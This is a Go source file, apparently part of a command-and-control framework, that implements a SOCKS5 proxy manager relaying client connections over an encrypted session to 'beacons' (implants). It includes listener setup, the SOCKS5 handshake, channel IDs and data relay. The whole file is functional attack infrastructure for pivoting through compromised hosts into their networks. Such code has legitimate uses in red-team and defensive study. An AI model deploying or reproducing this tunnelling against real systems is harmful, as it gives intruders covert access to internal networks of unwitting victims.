package server

import (
	"fmt"
	"net"
	"sync"
	"time"

	"c2/protocol"
	"c2/store"
	"c2/ui"
)

// SocksManager handles SOCKS5 proxy lifecycle and channel relay between SOCKS
// clients and beacons over the session TCP connection.
type SocksManager struct {
	store       *store.Store
	hub         *Hub
	defaultBind string
	mu          sync.RWMutex
	ackWaiters  map[string]chan uint8
}

// NewSocksManager creates a new SocksManager.
func NewSocksManager(s *store.Store, hub *Hub, defaultBind string) *SocksManager {
	return &SocksManager{
		store:       s,
		hub:         hub,
		defaultBind: defaultBind,
		ackWaiters:  make(map[string]chan uint8),
	}
}

// StartProxy starts a SOCKS5 listener for the given beacon. If requestedPort is
// 0, auto-picks from 1080-1099. Returns the bound host and port.
func (sm *SocksManager) StartProxy(beaconID uint32, requestedPort int, bind string) (string, int, error) {
	if sm.store.HasSocksProxy(beaconID) {
		return "", 0, fmt.Errorf("beacon %d already has an active SOCKS5 proxy", beaconID)
	}

	if bind == "" {
		bind = sm.defaultBind
	}

	var ln net.Listener
	var port int
	var err error

	if requestedPort != 0 {
		ln, err = net.Listen("tcp", fmt.Sprintf("%s:%d", bind, requestedPort))
		if err != nil {
			return "", 0, fmt.Errorf("listen on port %d: %w", requestedPort, err)
		}
		port = requestedPort
	} else {
		for p := 1080; p <= 1099; p++ {
			ln, err = net.Listen("tcp", fmt.Sprintf("%s:%d", bind, p))
			if err == nil {
				port = p
				break
			}
		}
		if ln == nil {
			return "", 0, fmt.Errorf("no free port in range 1080-1099")
		}
	}

	proxy := &store.SocksProxy{
		BeaconID: beaconID,
		Host:     bind,
		Port:     port,
		Listener: ln,
		Channels: make(map[uint32]net.Conn),
	}
	sm.store.RegisterSocksProxy(proxy)

	go sm.acceptLoop(proxy)

	ui.Success("socks", fmt.Sprintf("beacon %d SOCKS5 proxy on %s:%d", beaconID, bind, port))
	return bind, port, nil
}

// StopProxy closes all channels, the listener, and removes the proxy from store.
func (sm *SocksManager) StopProxy(beaconID uint32) {
	proxy := sm.store.GetSocksProxy(beaconID)
	if proxy == nil {
		return
	}

	proxy.Mu.Lock()
	for chanID, conn := range proxy.Channels {
		conn.Close()
		delete(proxy.Channels, chanID)
	}
	proxy.Mu.Unlock()

	if proxy.Listener != nil {
		proxy.Listener.Close()
	}
	sm.store.RemoveSocksProxy(beaconID)
	ui.Error("socks", fmt.Sprintf("beacon %d SOCKS5 proxy stopped", beaconID))
}

// SetSocksConn sets the beacon's SOCKS TCP connection on the proxy.
func (sm *SocksManager) SetSocksConn(beaconID uint32, conn net.Conn) {
	proxy := sm.store.GetSocksProxy(beaconID)
	if proxy == nil {
		return
	}
	proxy.Mu.Lock()
	proxy.Conn = conn
	proxy.Mu.Unlock()
}

func (sm *SocksManager) acceptLoop(proxy *store.SocksProxy) {
	for {
		client, err := proxy.Listener.Accept()
		if err != nil {
			return // listener closed
		}
		go sm.handleClient(proxy, client)
	}
}

// handleClient performs SOCKS5 handshake (no-auth, CONNECT only), sends
// TaskSocksOpen to the beacon, waits for ACK, then relays data.
func (sm *SocksManager) handleClient(proxy *store.SocksProxy, client net.Conn) {
	defer func() {
		// cleanup on any early return; normal path removes the channel explicitly
		_ = client
	}()

	client.SetDeadline(time.Now().Add(15 * time.Second))

	// --- SOCKS5 greeting ---
	// [version(1), nmethods(1), methods(nmethods)]
	buf := make([]byte, 257)
	if _, err := client.Read(buf[:2]); err != nil || buf[0] != 0x05 {
		client.Close()
		return
	}
	nmethods := int(buf[1])
	if nmethods > 0 {
		if _, err := client.Read(buf[:nmethods]); err != nil {
			client.Close()
			return
		}
	}
	// Reply: no-auth
	if _, err := client.Write([]byte{0x05, 0x00}); err != nil {
		client.Close()
		return
	}

	// --- SOCKS5 CONNECT request ---
	// [ver(1), cmd(1), rsv(1), atyp(1), addr, port(2)]
	if _, err := client.Read(buf[:4]); err != nil || buf[0] != 0x05 {
		client.Close()
		return
	}
	if buf[1] != 0x01 { // only CONNECT
		client.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // command not supported
		client.Close()
		return
	}

	addrType := buf[3]
	var addrPayload []byte // atyp + addr + port (raw bytes to forward to beacon)

	switch addrType {
	case 0x01: // IPv4
		if _, err := client.Read(buf[:6]); err != nil {
			client.Close()
			return
		}
		addrPayload = append([]byte{addrType}, buf[:6]...)
	case 0x03: // domain
		if _, err := client.Read(buf[:1]); err != nil {
			client.Close()
			return
		}
		dlen := int(buf[0])
		if _, err := client.Read(buf[1 : 1+dlen+2]); err != nil {
			client.Close()
			return
		}
		addrPayload = append([]byte{addrType, buf[0]}, buf[1:1+dlen+2]...)
	case 0x04: // IPv6
		if _, err := client.Read(buf[:18]); err != nil {
			client.Close()
			return
		}
		addrPayload = append([]byte{addrType}, buf[:18]...)
	default:
		client.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // address type not supported
		client.Close()
		return
	}

	client.SetDeadline(time.Time{})

	// --- Assign channel ID ---
	chanID := proxy.NextChanID.Add(1)

	// Register channel
	proxy.Mu.Lock()
	proxy.Channels[chanID] = client
	proxy.Mu.Unlock()

	// --- Send TaskSocksOpen to beacon ---
	hdr := protocol.TaskHeader{
		Type:   protocol.TaskSocksOpen,
		Label:  chanID,
		Length: uint32(len(addrPayload)),
	}
	taskBytes := append(protocol.EncodeHeader(hdr), addrPayload...)

	beacon := sm.store.GetBeacon(proxy.BeaconID)
	if beacon == nil {
		sm.removeChannel(proxy, chanID)
		client.Close()
		return
	}

	proxy.Mu.RLock()
	socksConn := proxy.Conn
	proxy.Mu.RUnlock()

	if socksConn == nil {
		sm.removeChannel(proxy, chanID)
		client.Close()
		return
	}

	encrypted, err := protocol.Encrypt(beacon.SessionKey, taskBytes)
	if err != nil {
		sm.removeChannel(proxy, chanID)
		client.Close()
		return
	}
	if err := WriteEnvelope(socksConn, encrypted); err != nil {
		sm.removeChannel(proxy, chanID)
		client.Close()
		return
	}

	// --- Wait for ACK ---
	ackKey := fmt.Sprintf("%d:%d", proxy.BeaconID, chanID)
	ackCh := make(chan uint8, 1)
	sm.mu.Lock()
	sm.ackWaiters[ackKey] = ackCh
	sm.mu.Unlock()

	defer func() {
		sm.mu.Lock()
		delete(sm.ackWaiters, ackKey)
		sm.mu.Unlock()
	}()

	var ackCode uint8
	select {
	case ackCode = <-ackCh:
	case <-time.After(15 * time.Second):
		// Timeout
		client.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // host unreachable
		sm.removeChannel(proxy, chanID)
		client.Close()
		return
	}

	if ackCode != 0x00 {
		client.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0}) // host unreachable
		sm.removeChannel(proxy, chanID)
		client.Close()
		return
	}

	// --- SOCKS5 success reply ---
	client.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

	// --- Relay: client → beacon ---
	go func() {
		relayBuf := make([]byte, 32*1024)
		for {
			n, err := client.Read(relayBuf)
			if n > 0 {
				dataHdr := protocol.TaskHeader{
					Type:   protocol.TaskSocksData,
					Label:  chanID,
					Length: uint32(n),
				}
				dataBytes := append(protocol.EncodeHeader(dataHdr), relayBuf[:n]...)

				enc, encErr := protocol.Encrypt(beacon.SessionKey, dataBytes)
				if encErr != nil {
					break
				}
				proxy.Mu.RLock()
				sc := proxy.Conn
				proxy.Mu.RUnlock()
				if sc == nil {
					break
				}
				if wErr := WriteEnvelope(sc, enc); wErr != nil {
					break
				}
			}
			if err != nil {
				break
			}
		}

		// Send TaskSocksClose to beacon
		closeHdr := protocol.TaskHeader{
			Type:   protocol.TaskSocksClose,
			Label:  chanID,
		}
		closeBytes := protocol.EncodeHeader(closeHdr)
		if enc, err := protocol.Encrypt(beacon.SessionKey, closeBytes); err == nil {
			proxy.Mu.RLock()
			sc := proxy.Conn
			proxy.Mu.RUnlock()
			if sc != nil {
				WriteEnvelope(sc, enc)
			}
		}
		sm.removeChannel(proxy, chanID)
	}()
}

// DeliverAck delivers an ACK from the beacon to the waiting handleClient goroutine.
func (sm *SocksManager) DeliverAck(beaconID, chanID uint32, code uint8) {
	key := fmt.Sprintf("%d:%d", beaconID, chanID)
	sm.mu.RLock()
	ch, ok := sm.ackWaiters[key]
	sm.mu.RUnlock()
	if ok {
		select {
		case ch <- code:
		default:
		}
	}
}

// DeliverData writes data received from the beacon to the SOCKS client connection.
func (sm *SocksManager) DeliverData(beaconID, chanID uint32, data []byte) {
	proxy := sm.store.GetSocksProxy(beaconID)
	if proxy == nil {
		return
	}
	proxy.Mu.RLock()
	conn, ok := proxy.Channels[chanID]
	proxy.Mu.RUnlock()
	if ok && conn != nil {
		conn.Write(data)
	}
}

// DeliverClose closes the SOCKS client connection for a channel.
func (sm *SocksManager) DeliverClose(beaconID, chanID uint32) {
	proxy := sm.store.GetSocksProxy(beaconID)
	if proxy == nil {
		return
	}
	proxy.Mu.RLock()
	conn, ok := proxy.Channels[chanID]
	proxy.Mu.RUnlock()
	if ok && conn != nil {
		conn.Close()
	}
	sm.removeChannel(proxy, chanID)
}

func (sm *SocksManager) removeChannel(proxy *store.SocksProxy, chanID uint32) {
	proxy.Mu.Lock()
	delete(proxy.Channels, chanID)
	proxy.Mu.Unlock()
}
